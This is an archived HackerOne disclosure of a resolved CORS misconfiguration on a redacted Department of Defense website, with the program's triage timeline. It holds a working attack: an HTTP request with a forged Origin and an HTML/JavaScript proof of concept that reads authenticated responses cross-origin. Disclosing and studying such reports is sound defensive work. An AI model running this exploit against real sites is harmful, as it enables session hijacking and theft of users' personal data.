---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2019-01-28
submitted: 2018-12-20T15:15:12.102Z
bounty_usd: null
votes: 34
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "jarvis0x1"
source: "https://hackerone.com/reports/470298"
title: "[██████] Cross-origin resource sharing misconfiguration (CORS)"
---
# [██████] Cross-origin resource sharing misconfiguration (CORS)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 34 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-01-28

- Report: [https://hackerone.com/reports/470298](https://hackerone.com/reports/470298)
- CWE: Improper Access Control - Generic
- Submitted: 2018-12-20T15:15:12.102Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi!

In this report I want to describe High level bug which can seriously compromise a user account.

If I am authorize on this site, I can steal user's sessions, some personal information or do some action.

### Steps for reproduce

1) Send this request

```
GET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1
Host: www.█████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: exploit.com
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

In response headers you can see headers
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: exploit.com
```

{F395049}


So you can write exploit:
```
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
	        var xhttp = new XMLHttpRequest();
		        xhttp.onreadystatechange = function() {
			        if (this.readyState == 4 && this.status == 200) {
			        	document.getElementById("emo").innerHTML = alert(this.responseText);
	        }
         };
         xhttp.open("GET", "https://www.███/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

Result:
{F395063}
### How to fix

Rather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.

## Timeline

- **Report Filed**
- **2018-12-20** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **2019-01-17** @jarvis0x1: Also severity of this bug is High, not Low. And you can also cut or shade domain  from name of report (If you want)
- **2019-01-22** @agent-1: @jarvis7

This was a great find, thank you! Your disclosure is approved. Please use the following text:

A Cross-origin resource sharing misconfiguration (CORS) vulnerability with a severity rating of high was discovered on a DoD website by researcher jarvis7. He provided an in-depth, step-by-step proof of concept (POC) which demonstrated his ability to compromise a user account; resulting in the hijacking of a user's sessions, theft of some personal information, and follow-on malicious actions. A job well done jarvis7, and thank you for keeping our websites secure!

We would like to congratulate you on Twitter (@DC3VDP) if that is acceptable. If yes please verify your Twitter handle is @Jarvis7717. We will redact information in H1 on this vulnerability submission so you can disclose the technical aspects as well as your POC. Please give us 2 weeks to perform this manual process. Thanks again!

DoD VDP Team
- **Report Severity Updated**
- **2019-01-22** @ag3nt-j1: Also upped the severity since you actually supplied a working PoC.  Thanks Jarvis!
- **2019-01-22** @jarvis0x1: Yes, this is my twitter https://twitter.com/Jarvis7717, of course you can write in twitter about this!) Nice text for disclose. Thanks!
- **2019-01-22** @jarvis0x1: ██████
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
